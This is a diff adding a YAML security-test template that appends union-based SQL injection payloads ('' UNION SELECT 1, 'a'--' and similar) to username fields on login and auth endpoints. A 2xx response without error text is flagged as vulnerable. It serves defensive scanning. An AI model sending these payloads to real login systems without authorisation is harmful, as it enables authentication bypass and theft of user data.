@@ -1,0 +1,137 @@
+id: UNION_DATA_TYPE_BASED_SQLI
+info:
+  name: "Union based SQL Injection test with data type variations on Login Endpoints"
+  description: > 
+    "A Union-based SQL Injection test with data type variations on login endpoints involves injecting SQL queries that manipulate the data types used in UNION SELECT statements. This method aims to exploit vulnerabilities by combining results from queries that handle different data types, potentially revealing sensitive information. Testers adjust their injections to match expected data types in the database schema, observing how the application responds to identify and exploit weaknesses in input validation and SQL query execution."
+  details: >
+    "In a Union-based SQL Injection test with data type variations on login endpoints, testers inject SQL queries with UNION SELECT statements that manipulate data types (such as integers, strings, or dates) to retrieve specific information from different database columns. This method aims to bypass security measures by exploiting mismatches in data type handling within SQL queries. By observing how the application responds to these injections, testers can uncover vulnerabilities related to improper input validation and potentially gain unauthorized access to sensitive data."
+  impact: >
+    "The impact of Union-based SQL Injection with data type variations on login endpoints can be profound, allowing attackers to manipulate database queries to extract sensitive information. Exploiting these vulnerabilities can lead to unauthorized access to user credentials, exposure of personal data, and potential compromise of the entire database. Such breaches can result in significant reputational damage, legal liabilities, and financial losses for affected organizations, highlighting the critical importance of robust SQL injection prevention measures."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: UNION_DATA_TYPE_BASED_SQLI
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains_either:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  url:
+    contains_either:
+      - login
+      - signin
+      - authenticate
+      - auth
+  request_payload:
+    for_one:
+      key:
+        regex: "^username$|^user$|^userid$|^user_id$|^login$|^login_id$|^email$|^account$|^account_id$|^member$|^member_id$|^id$|^user_name$|^uname$|^identifier$|^user_identifier$|^admin$|^nick$|^nickname$|^handle$|^alias$|^principal$|^profile$|^profile_id$|^name$|^signin$|^auth$|^credential$|^user_login$|^user_account$|^user_email$|^employee$|^employee_id$|^operator$|^customer_id$|^client_id$|^subscriber$|^subscriber_id$|^participant$|^participant_id$|^client_id$|^userLoginID$|^client-name$"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  unionBasedPayloads:
+    - "' UNION SELECT 'a', 'b'--"
+    - "' UNION SELECT 1, 'a'--"
+    - "' UNION SELECT 'a', 1--"
+    - "' UNION SELECT 1, null--"
+    - "' UNION SELECT null, 'a'--"
+    - "' UNION SELECT 'a', null--"
+    - "' UNION SELECT 1, 'a', 'b'--"
+    - "' UNION SELECT 'a', 'b', 'c'--"
+    - "' UNION SELECT 1, 2, 'a'--"
+    - "' UNION SELECT null, 1, 'a'--"
+    - "' UNION SELECT 'a', null, 1--"
+    - "' UNION SELECT 1, null, null--"
+    - "' UNION SELECT null, 'a', null--"
+    - "' UNION SELECT null, null, 'a'--"
+execute:
+  type: single
+  requests:
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${unionBasedPayloads}
+        
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains_either:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+  
+  
